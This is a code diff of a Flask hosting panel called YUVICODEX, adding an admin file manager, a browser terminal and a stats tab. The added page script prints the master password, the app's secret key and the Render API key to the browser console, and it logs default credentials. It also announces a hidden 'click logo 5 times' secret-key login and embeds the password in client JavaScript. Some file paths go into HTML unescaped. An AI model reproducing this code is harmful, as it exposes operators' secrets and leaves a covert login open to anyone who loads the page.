+                const username = newUsername.value.trim();
+                const password = newPassword.value.trim();
+                const expiry = newExpiry.value.trim();
+                const role = newRole.value;
+                if (!username || !password) {
+                    await customAlert('Username and Password required.', '⚠️');
+                    return;
+                }
+                try {
+                    await apiCall('/api/users', {
+                        method: 'POST',
+                        body: JSON.stringify({ username, password, role, expiry })
+                    });
+                    await loadAdminUsers();
+                    newUsername.value = '';
+                    newPassword.value = '';
+                    newExpiry.value = '';
+                    createUserForm.style.display = 'none';
+                    await customAlert(`User ${username} created.`, '✅');
+                } catch (e) {
+                    await customAlert(e.message || 'Creation failed', '❌');
+                }
+            }
+
+            // ---------- FILE MANAGER ----------
+            const fileManagerList = document.getElementById('fileManagerList');
+            const fileBreadcrumb = document.getElementById('fileBreadcrumb');
+            const contextMenu = document.getElementById('fileContextMenu');
+            const ctxDelete = document.getElementById('ctxDelete');
+            const ctxRename = document.getElementById('ctxRename');
+            const ctxDownload = document.getElementById('ctxDownload');
+
+            let currentPath = '';
+            let selectedFilePath = null;
+
+            async function loadDirectory(path = '') {
+                currentPath = path;
+                try {
+                    const res = await fetch(`/api/files?path=${encodeURIComponent(path)}`);
+                    if (!res.ok) {
+                        const err = await res.json();
+                        await customAlert(err.error || 'Failed to load', '❌');
+                        return;
+                    }
+                    const data = await res.json();
+                    renderFileList(data);
+                } catch (e) {
+                    await customAlert('Error: ' + e.message, '❌');
+                }
+            }
+
+            function renderFileList(data) {
+                const items = data.items || [];
+                let breadHtml = '';
+                const parts = currentPath.split('/').filter(p => p);
+                let cum = '';
+                breadHtml += `<span onclick="window._loadDirectory('')">📁 root</span>`;
+                parts.forEach((p, idx) => {
+                    cum += (cum ? '/' : '') + p;
+                    breadHtml += `<span class="sep">/</span><span onclick="window._loadDirectory('${cum}')">${escapeHtml(p)}</span>`;
+                });
+                fileBreadcrumb.innerHTML = breadHtml;
+
+                let html = '';
+                if (currentPath) {
+                    html += `<div class="file-item" onclick="window._loadDirectory('${currentPath.split('/').slice(0, -1).join('/')}')">
+                        <span class="name"><i class="fa-solid fa-arrow-up"></i> ..</span>
+                    </div>`;
+                }
+                items.forEach(item => {
+                    const icon = item.type === 'directory' ? '<i class="fa-solid fa-folder dir-icon"></i>' : '<i class="fa-solid fa-file"></i>';
+                    const sizeText = item.type === 'file' ? (item.size / 1024).toFixed(1) + ' KB' : '';
+                    html += `
+                        <div class="file-item" data-path="${item.path}" data-type="${item.type}">
+                            <span class="name">${icon} ${escapeHtml(item.name)}</span>
+                            <span class="size">${sizeText}</span>
+                        </div>
+                    `;
+                });
+                fileManagerList.innerHTML = html;
+
+                document.querySelectorAll('.file-item').forEach(el => {
+                    el.addEventListener('click', function(e) {
+                        const path = this.dataset.path;
+                        const type = this.dataset.type;
+                        if (type === 'directory') {
+                            window._loadDirectory(path);
+                        } else {
+                            document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
+                            this.classList.add('selected');
+                            selectedFilePath = path;
+                        }
+                    });
+
+                    let timer;
+                    el.addEventListener('touchstart', function(e) {
+                        timer = setTimeout(() => {
+                            e.preventDefault();
+                            const path = this.dataset.path;
+                            showContextMenu(e.touches[0].clientX, e.touches[0].clientY, path);
+                            document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
+                            this.classList.add('selected');
+                            selectedFilePath = path;
+                        }, 3000);
+                    });
+                    el.addEventListener('touchend', function() { clearTimeout(timer); });
+                    el.addEventListener('touchmove', function() { clearTimeout(timer); });
+
+                    el.addEventListener('contextmenu', function(e) {
+                        e.preventDefault();
+                        const path = this.dataset.path;
+                        showContextMenu(e.clientX, e.clientY, path);
+                        document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
+                        this.classList.add('selected');
+                        selectedFilePath = path;
+                    });
+                });
+            }
+
+            function showContextMenu(x, y, path) {
+                contextMenu.style.display = 'block';
+                contextMenu.style.left = x + 'px';
+                contextMenu.style.top = y + 'px';
+                contextMenu.dataset.path = path;
+            }
+
+            function hideContextMenu() {
+                contextMenu.style.display = 'none';
+            }
+
+            ctxDelete.addEventListener('click', async function() {
+                const path = contextMenu.dataset.path || selectedFilePath;
+                if (!path) return;
+                hideContextMenu();
+                const confirmed = await customConfirm(`Delete ${path}?`, '🗑️');
+                if (!confirmed) return;
+                try {
+                    const res = await fetch('/api/files/delete', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ path })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Deleted.', '✅');
+                        loadDirectory(currentPath);
+                    } else {
+                        await customAlert(data.error || 'Delete failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            });
+
+            ctxRename.addEventListener('click', async function() {
+                const path = contextMenu.dataset.path || selectedFilePath;
+                if (!path) return;
+                hideContextMenu();
+                const newName = await customPrompt('Enter new name:', path.split('/').pop());
+                if (newName === null) return;
+                if (!newName.trim()) {
+                    await customAlert('Name cannot be empty.', '⚠️');
+                    return;
+                }
+                try {
+                    const res = await fetch('/api/files/rename', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ old_path: path, new_name: newName.trim() })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Renamed.', '✅');
+                        loadDirectory(currentPath);
+                    } else {
+                        await customAlert(data.error || 'Rename failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            });
+
+            ctxDownload.addEventListener('click', function() {
+                const path = contextMenu.dataset.path || selectedFilePath;
+                if (!path) return;
+                hideContextMenu();
+                window.open(`/api/files/download?path=${encodeURIComponent(path)}`, '_blank');
+            });
+
+            function customPrompt(message, defaultValue) {
+                return new Promise((resolve) => {
+                    const bodyHTML = `
+                        <div style="text-align:center;">
+                            <p style="margin-bottom:12px;">${message}</p>
+                            <input type="text" id="promptInput" value="${escapeHtml(defaultValue || '')}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                        </div>
+                    `;
+                    showCustomModal('✏️', bodyHTML, [
+                        { label: 'Cancel', value: null, className: 'btn-cancel' },
+                        { label: 'OK', value: true, className: 'btn-confirm' }
+                    ]).then((result) => {
+                        if (result === null) resolve(null);
+                        else {
+                            const val = document.getElementById('promptInput')?.value;
+                            resolve(val);
+                        }
+                    });
+                });
+            }
+
+            window._loadDirectory = function(path) {
+                hideContextMenu();
+                loadDirectory(path);
+            };
+
+            document.addEventListener('click', function(e) {
+                if (!contextMenu.contains(e.target)) {
+                    hideContextMenu();
+                }
+            });
+
+            // ---------- ADMIN TAB SWITCHING ----------
+            const adminTabBtns = document.querySelectorAll('.admin-tabs button');
+            const adminTabContents = {
+                tabAdminMenu: document.getElementById('tabAdminMenu'),
+                tabUserMenu: document.getElementById('tabUserMenu'),
+                tabTerminal: document.getElementById('tabTerminal'),
+                tabFileManager: document.getElementById('tabFileManager'),
+                tabStats: document.getElementById('tabStats')
+            };
+
+            adminTabBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabId = this.dataset.tab;
+                    adminTabBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    Object.keys(adminTabContents).forEach(key => {
+                        if (adminTabContents[key]) {
+                            adminTabContents[key].classList.toggle('active', key === tabId);
+                        }
+                    });
+                    if (tabId === 'tabTerminal') {
+                        setTimeout(() => terminalCommand.focus(), 100);
+                        if (!terminalPollInterval) {
+                            startTerminalPolling();
+                        }
+                    }
+                    if (tabId === 'tabFileManager') {
+                        loadDirectory('');
+                    }
+                    if (tabId === 'tabStats') {
+                        fetchStats();
+                        if (window.statsInterval) clearInterval(window.statsInterval);
+                        window.statsInterval = setInterval(fetchStats, 5000);
+                    } else {
+                        if (window.statsInterval) {
+                            clearInterval(window.statsInterval);
+                            window.statsInterval = null;
+                        }
+                    }
+                });
+            });
+
+            // ---------- TERMINAL ----------
+            async function startTerminalPolling() {
+                if (terminalPollInterval) clearInterval(terminalPollInterval);
+                try {
+                    await fetch('/api/terminal/start', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ password: '{{ password }}' })
+                    });
+                } catch (e) {
+                    console.error('Failed to start terminal:', e);
+                }
+                terminalPollInterval = setInterval(async () => {
+                    try {
+                        const res = await fetch('/api/terminal/read');
+                        const data = await res.json();
+                        if (data.output) {
+                            terminalOutput.innerHTML += `<span class="output">${escapeHtml(data.output)}</span>`;
+                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        }
+                        isTerminalRunning = data.running;
+                        termStopBtn.disabled = !isTerminalRunning;
+                    } catch (e) {
+                        // ignore
+                    }
+                }, 500);
+            }
+
+            async function sendTerminalData(data) {
+                try {
+                    await fetch('/api/terminal/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: data, password: '{{ password }}' })
+                    });
+                } catch (e) {
+                    console.error('Failed to send terminal input:', e);
+                }
+            }
+
+            async function stopTerminal() {
+                try {
+                    await fetch('/api/terminal/stop', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ password: '{{ password }}' })
+                    });
+                    terminalOutput.innerHTML += `<span class="prompt">[Terminal stopped]</span><br />`;
+                    isTerminalRunning = false;
+                    termStopBtn.disabled = true;
+                    setTimeout(() => {
+                        startTerminalPolling();
+                    }, 500);
+                } catch (e) {
+                    console.error('Failed to stop terminal:', e);
+                }
+            }
+
+            function clearTerminal() {
+                terminalOutput.innerHTML = '<span class="prompt">$ </span>Terminal cleared.<br />';
+            }
+
+            termRunBtn.addEventListener('click', function() {
+                const data = terminalCommand.value;
+                if (!data) return;
+                if (!isTerminalRunning) {
+                    // try to start
+                }
+                sendTerminalData(data);
+                terminalCommand.value = '';
+            });
+
+            termStopBtn.addEventListener('click', stopTerminal);
+            termClearBtn.addEventListener('click', clearTerminal);
+
+            terminalCommand.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    termRunBtn.click();
+                }
+            });
+
+            // ---------- STATS ----------
+            async function fetchStats() {
+                try {
+                    const res = await fetch('/api/stats');
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    document.getElementById('statTotalHours').textContent = data.total_hours + ' hrs';
+                    document.getElementById('statMainHours').textContent = data.main_hours + ' hrs';
+                    document.getElementById('statInternalHours').textContent = data.internal_hours + ' hrs';
+                    document.getElementById('statRenderHours').textContent = data.render_running_hours + ' hrs';
+                    document.getElementById('statRenderActive').textContent = data.render_active_count;
+                    document.getElementById('statStorage').textContent = data.storage_used_gb + ' GB';
+                    document.getElementById('statDiskFree').textContent = data.disk_free_gb || data.container_storage_free_gb || 0;
+                    document.getElementById('statRam').textContent = data.ram.percent + '%';
+                    document.getElementById('statRamUsed').textContent = data.ram.used_mb;
+                    document.getElementById('statRamTotal').textContent = data.ram.total_mb;
+                    document.getElementById('ramFill').style.width = Math.min(data.ram.percent, 100) + '%';
+                    document.getElementById('statCpu').textContent = data.cpu_percent + '%';
+                } catch (e) {
+                    console.error('Stats error:', e);
+                }
+            }
+
+            document.getElementById('setOffsetBtn')?.addEventListener('click', async function() {
+                const val = parseFloat(document.getElementById('offsetInput').value);
+                if (isNaN(val)) {
+                    await customAlert('Enter valid number', '⚠️');
+                    return;
+                }
+                try {
+                    const res = await fetch('/api/set_offset', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ offset: val })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Offset set to ' + val + ' hrs', '✅');
+                        fetchStats();
+                    } else {
+                        await customAlert(data.error || 'Failed', '❌');
+                    }
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            });
+
+            // ---------- EVENT BINDINGS ----------
+            loginBtn.addEventListener('click', handleLogin);
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && loginView.classList.contains('active')) {
+                    handleLogin();
+                }
+            });
+
+            hamburgerBtn.addEventListener('click', openAdminPanel);
+            adminCloseBtn.addEventListener('click', closeAdminPanel);
+            adminOverlay.addEventListener('click', function(e) {
+                if (e.target === this) closeAdminPanel();
+            });
+
+            logoutBtn.addEventListener('click', handleLogout);
+
+            toggleCreateUserBtn.addEventListener('click', function() {
+                const form = document.getElementById('createUserForm');
+                form.style.display = form.style.display === 'none' ? 'block' : 'none';
+            });
+
+            createUserBtn.addEventListener('click', handleCreateUser);
+
+            // ---------- INIT ----------
+            const loggedIn = {{ logged_in|tojson }};
+            if (loggedIn) {
+                currentUser = {
+                    username: '{{ username }}',
+                    role: '{{ session.get("role", "") }}'
+                };
+                loadWebsites();
+                loadBots();
+                if (currentUser.role === 'admin') {
+                    loadAdminUsers();
+                }
+            }
+
+            function escapeHtml(str) {
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
+
+            function formatUptime(seconds) {
+                if (seconds < 0) return '--';
+                const d = Math.floor(seconds / 86400);
+                const h = Math.floor((seconds % 86400) / 3600);
+                const m = Math.floor((seconds % 3600) / 60);
+                const s = Math.floor(seconds % 60);
+                return `${d}d ${h}h ${m}m ${s}s`;
+            }
+
+            console.log('🔐 YUVICODEX System ready (Websites + Bots).');
+            console.log('📋 Default accounts: admin/admin123 (admin), user1/pass123, user2/pass456');
+            console.log('💻 Use upload to deploy websites or bots.');
+            console.log('🔑 Master Password: {{ MASTER_PASSWORD if MASTER_PASSWORD else "not set" }}');
+            console.log('🔐 Secret Key: {{ SECRET_KEY if SECRET_KEY else "not set" }}');
+            console.log('👉 Click logo 5 times for secret key login.');
+            console.log('📡 Interactive terminal started.');
+            console.log('🔑 Render API Key: {{ RENDER_API_KEY if RENDER_API_KEY else "not set" }}');
+
+        })();
     </script>
 </body>
 </html>
 """
 
-# ============================================================
-# 📍 ROOT ROUTE
-# ============================================================
-
-@app.route('/')
-def index():
-    settings = load_settings()
-    logged_in = 'username' in session
-    is_admin = session.get('role') == 'admin' if logged_in else False
-    username = session.get('username') if logged_in else ''
-    user_password = ''
-    if logged_in:
-        user_obj = find_user(username)
-        if user_obj:
-            user_password = user_obj.get('password', '')
-    logo_url = settings.get('logo', None)
-    if logo_url:
-        logo_url = logo_url + '?v=' + str(int(time.time()))
-    return render_template_string(
-        HTML_TEMPLATE,
-        website_name=settings.get('website_name', 'YUVICODEX'),
-        logo_url=logo_url,
-        social_links=settings.get('social_links', {})
-    )
-
-# ============================================================
-# 📍 WEBSITE FILES ROUTES
-# ============================================================
-
-@app.route('/website/<int:website_id>/files')
+# ---------- ADD MISSING ROUTE FOR /api/websites ----------
+@app.route('/api/websites')
 @login_required
-def website_files(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        return "Not found", 404
-    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
-    if not os.path.exists(folder):
-        return "Folder not found", 404
-    items = []
-    for root, dirs, files_list in os.walk(folder):
-        rel = os.path.relpath(root, folder)
-        if rel == '.': rel = ''
-        for f in files_list:
-            full = os.path.join(root, f)
-            items.append({'name': f, 'path': os.path.join(rel, f).replace('\\', '/'), 'is_dir': False, 'size': os.path.getsize(full)})
-        for d in dirs:
-            items.append({'name': d, 'path': os.path.join(rel, d).replace('\\', '/'), 'is_dir': True})
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html><head><title>Files</title>
-    <style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:1000px;margin:auto}a{color:#00e5ff;text-decoration:none}.upload-area{margin:15px 0;padding:20px;border:2px dashed rgba(255,255,255,0.2);border-radius:15px;text-align:center}ul{list-style:none}li{display:flex;justify-content:space-between;padding:10px 15px;border-bottom:1px solid rgba(255,255,255,0.05)}</style>
-    </head><body><div class="container"><a href="/">← Dashboard</a><h2>{{ website.website_name or website.website_slug }}</h2>
-    <div class="upload-area"><input type="file" id="fileUpload" multiple><button onclick="uploadFile()">Upload</button></div>
-    <ul>{% for item in items %}<li><span>{% if item.is_dir %}📁 {% else %}📄 {% endif %}{{ item.name }}</span><span>{% if not item.is_dir %}<a href="/website/{{ website.id }}/edit?path={{ item.path }}">✏️</a> <a href="/website/{{ website.id }}/file/download?path={{ item.path }}">⬇️</a>{% endif %} <button onclick="deleteFile('{{ item.path }}')">🗑</button></span></li>{% endfor %}</ul>
-    <script>
-    function uploadFile(){const f=document.getElementById('fileUpload').files;if(!f.length)return;const fd=new FormData();for(let i=0;i<f.length;i++)fd.append('file',f[i]);fetch('/website/{{ website.id }}/file/upload',{method:'POST',body:fd}).then(()=>location.reload())}
-    function deleteFile(p){if(!confirm('Delete?'))return;fetch('/website/{{ website.id }}/file/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p})}).then(()=>location.reload())}
-    </script></body></html>
-    """, website=w, items=items)
+def api_list_websites():
+    username = session['username']
+    with get_db() as conn:
+        websites = conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, 'website')).fetchall()
+    return jsonify([dict(row) for row in websites])
 
-@app.route('/website/<int:website_id>/edit', methods=['GET', 'POST'])
-@login_required
-def website_edit_file(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        return "Not found", 404
-    file_path = request.args.get('path', '').strip()
-    if not file_path:
-        return "No path", 400
-    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", file_path)
-    if not os.path.exists(full) or not os.path.isfile(full):
-        return "File not found", 404
-    if request.method == 'GET':
-        with open(full, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        return render_template_string("""
-        <!DOCTYPE html>
-        <html><head><title>Edit</title>
-        <style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:900px;margin:auto}textarea{width:100%;height:400px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:15px;color:#fff;padding:15px;font-family:monospace;outline:none}.save{background:#00e5ff;border:none;padding:12px 30px;border-radius:50px;color:#000;font-weight:700;cursor:pointer}</style>
-        </head><body><div class="container"><a href="/website/{{ website.id }}/files">← Back</a><h2>{{ file_path }}</h2><form method="POST"><textarea name="content">{{ content }}</textarea><button class="save" type="submit">Save</button></form></div></body></html>
-        """, website=w, file_path=file_path, content=content)
-    else:
-        with open(full, 'w', encoding='utf-8') as f:
-            f.write(request.form.get('content', ''))
-        return redirect(f'/website/{website_id}/files')
-
-@app.route('/website/<int:website_id>/file/upload', methods=['POST'])
-@login_required
-def website_upload_file(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        return jsonify({'error': 'Unauthorized'}), 401
-    if 'file' not in request.files:
-        return jsonify({'error': 'No file'}), 400
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({'error': 'Empty'}), 400
-    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
-    os.makedirs(folder, exist_ok=True)
-    filename = secure_filename(file.filename)
-    file.save(os.path.join(folder, filename))
-    return jsonify({'success': True})
-
-@app.route('/website/<int:website_id>/file/delete', methods=['POST'])
-@login_required
-def website_delete_file(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        return jsonify({'error': 'Unauthorized'}), 401
-    path = request.json.get('path', '').strip()
-    if not path:
-        return jsonify({'error': 'Path required'}), 400
-    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
-    if not os.path.exists(full):
-        return jsonify({'error': 'Not found'}), 404
-    if os.path.isdir(full): shutil.rmtree(full)
-    else: os.remove(full)
-    return jsonify({'success': True})
-
-@app.route('/website/<int:website_id>/file/download', methods=['GET'])
-@login_required
-def website_download_file(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        return "Not found", 404
-    path = request.args.get('path', '').strip()
-    if not path:
-        return "No path", 400
-    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
-    if not os.path.exists(full) or os.path.isdir(full):
-        return "File not found", 404
-    return send_file(full, as_attachment=True)
-
+# ---------- BUILD LOGS PAGE (for websites) ----------
 @app.route('/website/<int:website_id>/build')
 @login_required
 def build_logs_page(website_id):
     w = get_website_by_id(website_id)
     if not w or w['owner_username'] != session['username']:
-        return "Not found", 404
+        abort(404)
     with get_db() as conn:
         dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html><head><title>Build Logs</title>
-    <style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
-    </head><body><div class="top-bar"><h2>Build Logs</h2><a href="/">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">{% if no_logs %}No deployment logs.{% endif %}</div></div>
-    <script>
-    const evt = new EventSource('/deploy/{{ website.id }}/logs');
-    evt.onmessage = function(e) {
-        if (e.data === '[REFRESH]') { location.reload(); return; }
-        const div = document.createElement('div');
-        div.textContent = e.data;
-        document.getElementById('logContainer').appendChild(div);
-        document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
-    };
-    </script></body></html>
-    """, website=w, no_logs=not dep)
+    return render_template_string(BUILD_LOGS_TEMPLATE, website=w, no_logs=not dep)
 
-@app.route('/deploy/<int:website_id>/logs')
-@login_required
-def deploy_logs_sse(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        return "Not found", 404
-    with get_db() as conn:
-        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
-    if not dep:
-        return "No deployment", 404
-    log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
-    def generate():
-        if os.path.exists(log_file):
-            with open(log_file, 'r') as f:
-                for line in f:
-                    yield f"data: {line.strip()}\n\n"
-        last_size = os.path.getsize(log_file) if os.path.exists(log_file) else 0
-        while True:
-            time.sleep(0.5)
-            if os.path.exists(log_file):
-                cur = os.path.getsize(log_file)
-                if cur > last_size:
-                    with open(log_file, 'r') as f:
-                        f.seek(last_size)
-                        for line in f:
-                            yield f"data: {line.strip()}\n\n"
-                    last_size = cur
-            with get_db() as conn:
-                status = conn.execute('SELECT status FROM deployments WHERE id = ?', (dep['id'],)).fetchone()
-            if status and status['status'] in ('success', 'failed'):
-                yield f"data: [SYSTEM] Completed with status: {status['status']}\n\n"
-                break
-    return Response(stream_with_context(generate()), mimetype='text/event-stream')
+BUILD_LOGS_TEMPLATE = """
+<!DOCTYPE html>
+<html><head><title>Build Logs</title>
+<style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
+</head><body><div class="top-bar"><h2>Build Logs</h2><a href="/dashboard">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">{% if no_logs %}No deployment logs.{% endif %}</div></div>
+<script>
+const evt = new EventSource('/deploy/{{ website.id }}/logs');
+evt.onmessage = function(e) {
+    if (e.data === '[REFRESH]') { location.reload(); return; }
+    const div = document.createElement('div');
+    div.textContent = e.data;
+    document.getElementById('logContainer').appendChild(div);
+    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+};
+</script></body></html>
+"""
 
-# ============================================================
-# 📍 MAIN START
-# ============================================================
-
+# ---------- MAIN START ----------
 LOG_FOLDER = os.path.join(BASE_DIR, 'logs')
 os.makedirs(LOG_FOLDER, exist_ok=True)
 
@@ -3549,10 +5704,11 @@ MAIN_START_TIME = int(time.time())
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print("="*60)
-    print("🚀 YUVICODEX ULTIMATE")
+    print("🚀 YUVICODEX ULTIMATE (Websites + Bots + Stats)")
     print(f"🌐 Port: {port}")
     print("👤 Admin: admin / admin123")
-    print("💾 Storage Limit: 10GB")
+    print("📊 Stats: Owner only. Set Offset from Render Dashboard.")
+    print("🌍 Websites at /<slug>/")
     print("🔑 Render API Key: " + (RENDER_API_KEY if RENDER_API_KEY else "NOT SET"))
     print("="*60)
     app.run(host='0.0.0.0', port=port, debug=False)
